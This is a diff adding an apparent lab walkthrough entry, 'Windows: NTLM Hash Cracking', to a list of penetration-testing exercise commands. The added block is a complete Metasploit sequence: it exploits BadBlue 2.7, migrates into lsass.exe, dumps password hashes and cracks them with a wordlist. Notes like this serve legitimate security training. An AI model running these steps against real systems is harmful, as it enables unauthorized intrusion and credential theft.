@@ -2157,8 +2157,25 @@ nmap -p- 192.99.109.3
 curl 192.99.109.3:8000
 curl 192.99.109.3:8000/flag.txt
 ```
-
-
+114) Windows: NTLM Hash Cracking
+```
+cat /root/Desktop/target
+nmap 10.0.23.193
+nmap -sV -p 80 10.0.23.193
+searchsploit badblue 2.7
+/etc/init.d/postgresql start
+msfconsole -q
+use exploit/windows/http/badblue_passthru
+set RHOSTS 10.0.23.193
+exploit
+migrate -N lsass.exe
+hashdump
+background
+creds
+use auxiliary/analyze/crack_windows
+set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+exploit
+```
 
 
 
